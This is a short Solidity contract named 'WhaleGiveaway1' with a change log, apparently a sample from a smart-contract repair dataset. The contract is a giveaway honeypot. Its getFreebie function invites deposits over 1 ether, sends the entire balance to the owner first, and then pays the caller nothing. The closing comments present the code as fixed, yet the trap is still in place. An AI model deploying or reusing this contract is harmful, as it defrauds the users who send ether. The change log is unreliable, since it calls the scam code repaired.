pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}

// Changes Made:
// 1. Changed variable name Owner to owner to follow naming conventions.
// 2. Removed the condition where Owner is set to a specific address in withdraw() function.
// 3. Removed the unchecked low level call vulnerability by adding require() to check the return value of the external call in Command() function.